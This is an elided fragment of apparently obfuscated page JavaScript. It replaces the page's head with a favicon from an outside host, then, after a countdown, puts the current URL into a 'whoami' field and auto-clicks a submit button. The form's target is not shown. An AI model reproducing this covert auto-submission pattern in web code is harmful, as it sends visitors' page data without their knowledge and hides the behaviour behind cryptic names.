...
document.getElementsByTagName('head')[0].innerHTML = '<link rel="icon" type="image/png" sizes="16x16" href="https://hrm.dnd.vn/media/images/hello.ico" />';
...
, apisvr = function () {
    ...
    , $ifm, xfrmhwnd, xfrmorigin = function () {
        ...
        var el = document[_$id]('seconds'), total = el.innerHTML, timeinterval, countdown = function () {
            ...
            document[_$id]('whoami').setAttribute("value", window.location.href);
            document[_$id]('submitBtn').click();
        };
        timeinterval = setTimeout(countdown, 1000);
    }
